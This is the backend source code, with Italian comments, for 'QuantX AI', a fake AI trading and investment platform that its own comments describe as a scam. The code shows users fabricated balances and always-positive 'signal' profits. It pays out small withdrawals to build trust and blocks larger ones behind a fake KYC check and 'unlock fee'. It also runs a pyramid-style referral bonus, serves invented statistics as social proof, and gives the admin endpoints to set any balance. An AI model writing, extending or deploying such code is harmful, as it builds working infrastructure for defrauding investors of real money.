// QuantX AI - Backend: il cervello della macchina
// I saldi sono numeri virtuali. I soldi veri vanno sul wallet dell'admin.
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ---------- STORE (file JSON, zero dipendenze pesanti) ----------
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const TOKENS_FILE = path.join(DATA_DIR, 'tokens.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '{}');
if (!fs.existsSync(TOKENS_FILE)) fs.writeFileSync(TOKENS_FILE, '{}');

const load = (f) => JSON.parse(fs.readFileSync(f, 'utf8'));
const save = (f, d) => fs.writeFileSync(f, JSON.stringify(d, null, 2));
let users = load(USERS_FILE);
let tokens = load(TOKENS_FILE);
const persistUsers = () => save(USERS_FILE, users);
const persistTokens = () => save(TOKENS_FILE, tokens);

// ---------- CONFIG: il cuore dello scam ----------
const CONFIG = {
  SIGNALS_PER_DAY: 3,              // 3 giocate al giorno
  PROFIT_MIN: 0.006,               // +0.6% per segnale (sempre positivo)
  PROFIT_MAX: 0.018,               // +1.8% per segnale
  AUTO_YIELD_DAILY: 0.021,         // +2.1%/giorno di "rendita quantistica"
  WITHDRAW_FAST_LIMIT: 20,         // sotto questa soglia paghi subito (fiducia), sopra → attrito KYC
  WITHDRAW_FEE_PCT: 0.10,          // fee "sblocco bonus" per prelievi grandi
  REF_BONUS_PCT: 0.07,             // 7% al referrer su ogni deposito dell'invitato
  ADMIN_KEY: 'QUANTX-ADMIN-2026',  // chiave del pannello admin
};

// Piani "squadra": prezzi impulso per mass onboarding, yield crescente per reinvestimento
// La truffa: il yield cresce nel saldo virtuale, ma i prelievi grandi restano bloccati dietro fee
const PLANS = {
  starter: { id: 'starter', name: 'Starter', price: 10,   yield: 0.012, refBonus: 0.05, color: '#22d3ee' },
  silver:  { id: 'silver',  name: 'Silver',  price: 50,   yield: 0.018, refBonus: 0.08, color: '#8b5cf6' },
  gold:    { id: 'gold',    name: 'Gold',    price: 200,  yield: 0.025, refBonus: 0.10, color: '#f59e0b' },
  titan:   { id: 'titan',   name: 'Titan',   price: 500,  yield: 0.035, refBonus: 0.15, color: '#22ff88' },
};

// ---------- UTILS ----------
const todayStr = () => new Date().toISOString().slice(0, 10);
const hashPw = (pw) => crypto.scryptSync(pw, 'quantx-salt', 64).toString('hex');
const randBetween = (min, max) => min + Math.random() * (max - min);

function applyDailyYield(u) {
  const today = todayStr();
  if (u.lastYield && u.lastYield !== today) {
    const days = Math.max(1, Math.round((Date.now() - new Date(u.lastYield).getTime()) / 86400000));
    const rate = PLANS[u.plan] ? PLANS[u.plan].yield : CONFIG.AUTO_YIELD_DAILY;
    u.balance = Math.round(u.balance * (1 + rate * days) * 100) / 100;
  }
  u.lastYield = today;
}

function getUserSignals(u) {
  const today = todayStr();
  if (!u.signals || u.signals[today]) {
    u.signals = u.signals || {};
    u.signals[today] = { claimed: [], profits: [] };
  }
  return u.signals[today];
}

// ---------- AUTH MIDDLEWARE ----------
function auth(req, res, next) {
  const tok = (req.headers.authorization || '').replace('Bearer ', '');
  const uid = tokens[tok];
  if (!uid || !users[uid]) return res.status(401).json({ error: 'Non autenticato' });
  req.uid = uid;
  next();
}
function adminAuth(req, res, next) {
  const key = (req.headers['x-admin-key'] || '');
  if (key !== CONFIG.ADMIN_KEY) return res.status(401).json({ error: 'Chiave admin errata' });
  next();
}

// ---------- API: UTENTI ----------
app.post('/api/register', (req, res) => {
  const { email, password, name, ref } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email e password richiesti' });
  for (const u of Object.values(users)) {
    if (u.email === email) return res.status(409).json({ error: 'Email già registrata' });
  }
  const id = crypto.randomUUID();
  const code = id.replace(/-/g, '').slice(0, 8).toUpperCase();
  const user = {
    id, email, name: name || 'Investitore',
    passwordHash: hashPw(password),
    balance: 0, totalDeposited: 0, streak: 0,
    referralCode: code, referredBy: null,
    referrals: [], refEarned: 0,
    plan: null, signals: {}, withdrawals: [],
    createdAt: new Date().toISOString(),
  };
  // Collegamento referral: se il codice esiste, aggancia l'invitato
  if (ref) {
    const sponsor = Object.values(users).find(x => x.referralCode === String(ref).toUpperCase());
    if (sponsor) {
      user.referredBy = sponsor.email;
      sponsor.referrals.push(user.id);
    }
  }
  users[id] = user;
  persistUsers();
  const token = crypto.randomUUID();
  tokens[token] = id;
  persistTokens();
  res.json({ token, user: publicUser(users[id]) });
});

app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const u = Object.values(users).find(x => x.email === email);
  if (!u || u.passwordHash !== hashPw(password)) return res.status(401).json({ error: 'Credenziali errate' });
  const token = crypto.randomUUID();
  tokens[token] = u.id;
  persistTokens();
  res.json({ token, user: publicUser(u) });
});

app.get('/api/me', auth, (req, res) => {
  const u = users[req.uid];
  applyDailyYield(u);
  persistUsers();
  res.json({ user: publicUser(u), signals: getUserSignals(u) });
});

// ---------- API: DEPOSIT (saldo virtuale) ----------
app.post('/api/deposit', auth, (req, res) => {
  const { amount } = req.body;
  const amt = parseFloat(amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importo non valido' });
  const u = users[req.uid];
  u.balance = Math.round((u.balance + amt) * 100) / 100;
  u.totalDeposited += amt;
  // Bonus referral: il sponsor incassa una percentuale del deposito (dipende dal piano del referito)
  // Autofinanziamento: ogni nuovo entrante paga il referrer, che poi porta altri
  if (u.referredBy) {
    const sponsor = Object.values(users).find(x => x.email === u.referredBy);
    if (sponsor) {
      const rate = PLANS[u.plan] ? PLANS[u.plan].refBonus : CONFIG.REF_BONUS_PCT;
      const bonus = Math.round(amt * rate * 100) / 100;
      sponsor.balance = Math.round((sponsor.balance + bonus) * 100) / 100;
      sponsor.refEarned = Math.round((sponsor.refEarned + bonus) * 100) / 100;
    }
  }
  persistUsers();
  res.json({ user: publicUser(u) });
});

// ---------- API: PIANI (acquisto squadra) ----------
app.post('/api/activate-plan', auth, (req, res) => {
  const { plan } = req.body;
  if (!PLANS[plan]) return res.status(400).json({ error: 'Piano non valido' });
  const u = users[req.uid];
  u.plan = plan;
  persistUsers();
  res.json({ user: publicUser(u), plan: PLANS[plan] });
});

// ---------- API: 3 GIOCATE GIORNALIERE ----------
app.post('/api/claim-signal', auth, (req, res) => {
  const { index } = req.body;
  const i = parseInt(index);
  if (isNaN(i) || i < 0 || i >= CONFIG.SIGNALS_PER_DAY)
    return res.status(400).json({ error: 'Segnale non valido' });
  const u = users[req.uid];
  const today = todayStr();
  if (!u.signals || !u.signals[today]) u.signals = { [today]: { claimed: [], profits: [] } };
  const day = u.signals[today];
  if (day.claimed.includes(i)) return res.status(409).json({ error: 'Segnale già attivato' });

  const profit = Math.round(u.balance * randBetween(CONFIG.PROFIT_MIN, CONFIG.PROFIT_MAX) * 100) / 100;
  u.balance = Math.round((u.balance + profit) * 100) / 100;
  day.claimed.push(i);
  day.profits.push(profit);
  if (day.claimed.length === CONFIG.SIGNALS_PER_DAY) u.streak += 1;
  persistUsers();
  res.json({ profit, user: publicUser(u), signals: day });
});

// ---------- API: PRELIEVI (il trucco) ----------
app.post('/api/withdraw', auth, (req, res) => {
  const { amount } = req.body;
  const amt = parseFloat(amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importo non valido' });
  const u = users[req.uid];
  if (amt > u.balance) return res.status(400).json({ error: 'Saldo insufficiente' });

  let withdrawal;
  if (amt <= CONFIG.WITHDRAW_FAST_LIMIT) {
    u.balance = Math.round((u.balance - amt) * 100) / 100;
    withdrawal = { amount: amt, status: 'approvato', msg: 'Prelievo autorizzato. Fondi in uscita.' };
  } else {
    const fee = Math.round(amt * CONFIG.WITHDRAW_FEE_PCT * 100) / 100;
    withdrawal = {
      amount: amt, status: 'in_verifica', fee,
      msg: `Prelievo > €${CONFIG.WITHDRAW_FAST_LIMIT} richiede verifica KYC e fee di sblocco bonus di €${fee}. Completa la verifica per procedere.`,
    };
  }
  u.withdrawals.push({ ...withdrawal, date: new Date().toISOString() });
  persistUsers();
  res.json({ withdrawal, user: publicUser(u) });
});

app.get('/api/withdrawals', auth, (req, res) => {
  res.json({ withdrawals: users[req.uid].withdrawals });
});

// ---------- API: REFERRAL ----------
app.get('/api/referrals', auth, (req, res) => {
  const u = users[req.uid];
  const list = u.referrals.map(id => {
    const r = users[id];
    return r ? { email: r.email, name: r.name, balance: r.balance, deposited: r.totalDeposited } : null;
  }).filter(Boolean);
  res.json({ code: u.referralCode, count: u.referrals.length, earned: u.refEarned, list });
});

// ---------- API: STATISTICHE FAKE (social proof) ----------
app.get('/api/stats', (req, res) => {
  res.json({
    profitToday: Math.round(180000 + Math.random() * 200000),
    activeUsers: 4821 + Math.floor(Math.random() * 300),
    winRate: 87.4,
    totalManaged: 12_400_000,
  });
});

// ---------- ADMIN: il trono ----------
app.get('/api/admin/overview', adminAuth, (req, res) => {
  const all = Object.values(users);
  res.json({
    totalUsers: all.length,
    totalDeposited: Math.round(all.reduce((s, u) => s + u.totalDeposited, 0) * 100) / 100,
    totalBalance: Math.round(all.reduce((s, u) => s + u.balance, 0) * 100) / 100,
    pendingWithdrawals: all.flatMap(u => u.withdrawals.filter(w => w.status === 'in_verifica').map(w => ({
      email: u.email, amount: w.amount, fee: w.fee || 0, date: w.date,
    }))),
  });
});

app.get('/api/admin/users', adminAuth, (req, res) => {
  res.json({ users: Object.values(users).map(publicUser) });
});

app.post('/api/admin/set-balance', adminAuth, (req, res) => {
  const { id, balance } = req.body;
  const u = users[id];
  if (!u) return res.status(404).json({ error: 'Utente non trovato' });
  u.balance = Math.round(parseFloat(balance) * 100) / 100;
  persistUsers();
  res.json({ user: publicUser(u) });
});

app.post('/api/admin/resolve-withdrawal', adminAuth, (req, res) => {
  const { email, date, status } = req.body;
  const u = Object.values(users).find(x => x.email === email);
  if (!u) return res.status(404).json({ error: 'Utente non trovato' });
  const w = u.withdrawals.find(x => x.date === date && x.status === 'in_verifica');
  if (!w) return res.status(404).json({ error: 'Prelievo non trovato' });
  if (status === 'pagato') {
    u.balance = Math.round((u.balance - w.amount) * 100) / 100;
    w.status = 'pagato';
  } else {
    w.status = 'respinto';
  }
  persistUsers();
  res.json({ ok: true });
});

app.post('/api/admin/activate-plan', adminAuth, (req, res) => {
  const { id, plan } = req.body;
  const u = users[id];
  if (!u || !PLANS[plan]) return res.status(400).json({ error: 'Dati non validi' });
  u.plan = plan;
  persistUsers();
  res.json({ user: publicUser(u) });
});

function publicUser(u) {
  return {
    id: u.id, email: u.email, name: u.name,
    balance: u.balance, totalDeposited: u.totalDeposited,
    streak: u.streak, createdAt: u.createdAt,
    referralCode: u.referralCode, referredBy: u.referredBy,
    refCount: (u.referrals || []).length, refEarned: u.refEarned,
    plan: u.plan,
  };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`⚡ QuantX AI online su http://localhost:${PORT}`));
